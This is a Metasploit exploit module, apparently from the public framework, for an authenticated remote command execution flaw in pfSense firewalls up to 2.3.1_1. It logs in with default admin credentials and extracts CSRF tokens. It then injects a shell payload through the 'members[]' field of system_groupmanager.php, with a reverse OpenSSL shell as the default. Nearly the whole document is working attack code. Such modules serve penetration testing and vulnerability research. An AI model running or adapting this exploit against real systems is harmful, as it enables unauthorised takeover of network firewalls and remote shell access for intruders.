# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;pfSense authenticated group member RCE&#039;,
        &#039;Description&#039; => %q(
          pfSense, a free BSD based open source firewall distribution,
          version <= 2.3.1_1 contains a remote command execution
          vulnerability post authentication in the system_groupmanager.php page.
          Verified against 2.2.6 and 2.3.
        ),
        &#039;Author&#039;      =>
          [
            &#039;s4squatch&#039;, # discovery
            &#039;h00die&#039;     # module
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;43128&#039; ],
            [ &#039;URL&#039;, &#039;https://www.pfsense.org/security/advisories/pfSense-SA-16_08.webgui.asc&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => &#039;unix&#039;,
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039; => true,
            &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_openssl&#039;
          },
        &#039;Arch&#039;           => [ ARCH_CMD ],
        &#039;Payload&#039;        =>
          {
            &#039;Compat&#039; =>
              {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;perl openssl&#039;
              }
          },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Nov 06 2017&#039;
      )
    )

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;pfsense&#039;]),
        Opt::RPORT(443)
      ], self.class
    )
  end

  def login
    res = send_request_cgi(
      &#039;uri&#039; => &#039;/index.php&#039;,
      &#039;method&#039; => &#039;GET&#039;
    )
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200

    /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_status("CSRF Token for login: #{csrf}")

    res = send_request_cgi(
      &#039;uri&#039; => &#039;/index.php&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;__csrf_magic&#039; => csrf,
        &#039;usernamefld&#039;  => datastore[&#039;USERNAME&#039;],
        &#039;passwordfld&#039;  => datastore[&#039;PASSWORD&#039;],
        &#039;login&#039;        => &#039;&#039;
      }
    )
    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
    end
    if res.code == 302
      vprint_status(&#039;Successful Authentication&#039;)
      return res.get_cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      return nil
    end
  end

  def detect_version(cookie)
    res = send_request_cgi(
      &#039;uri&#039; => &#039;/index.php&#039;,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookie
    )
    unless res
      fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to authentication request")
    end
    /Version.+<strong>(?<version>[0-9\.\-RELEASE]+)[\n]?<\/strong>/m =~ res.body
    if version
      print_status("pfSense Version Detected: #{version}")
      return Gem::Version.new(version)
    end
    # If the device isn&#039;t fully setup, you get stuck at redirects to wizard.php
    # however, this does NOT stop exploitation strangely
    print_error("pfSens Version Not Detected or wizard still enabled.")
    Gem::Version.new(&#039;0.0&#039;)
  end

  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => &#039;/index.php&#039;,
        &#039;method&#039;    => &#039;GET&#039;
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200
      if /Login to pfSense/ =~ res.body
        Exploit::CheckCode::Detected
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end

  def exploit
    begin
      cookie = login
      version = detect_version(cookie)
      vprint_good(&#039;Login Successful&#039;)
      res = send_request_cgi(
        &#039;uri&#039;    => &#039;/system_groupmanager.php&#039;,
        &#039;method&#039; => &#039;GET&#039;,
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
          &#039;act&#039; => &#039;new&#039;
        }
      )

      /var csrfMagicToken = "(?<csrf>sid:[a-z0-9,;:]+)";/ =~ res.body
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
      vprint_status("CSRF Token for group creation: #{csrf}")

      group_name = rand_text_alpha(10)
      post_vars = {
        &#039;__csrf_magic&#039; => csrf,
        &#039;groupname&#039; => group_name,
        &#039;description&#039; => &#039;&#039;,
        &#039;members[]&#039; => "0&#039;;#{payload.encoded};&#039;",
        &#039;groupid&#039; => &#039;&#039;,
        &#039;save&#039; => &#039;Save&#039;
      }
      if version >= Gem::Version.new(&#039;2.3&#039;)
        post_vars = post_vars.merge(&#039;gtype&#039; => &#039;local&#039;)
      elsif version <= Gem::Version.new(&#039;2.3&#039;) # catch for 2.2.6. left this elsif for easy expansion to other versions as needed
        post_vars = post_vars.merge(
          &#039;act&#039; => &#039;&#039;,
          &#039;gtype&#039; => &#039;&#039;,
          &#039;privid&#039; => &#039;&#039;
        )
      end
      send_request_cgi(
        &#039;uri&#039;           => &#039;/system_groupmanager.php&#039;,
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;cookie&#039;        => cookie,
        &#039;vars_post&#039;     => post_vars,
        &#039;vars_get&#039; => {
          &#039;act&#039; => &#039;edit&#039;
        }
      )
      print_status("Manual removal of group #{group_name} is required.")
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

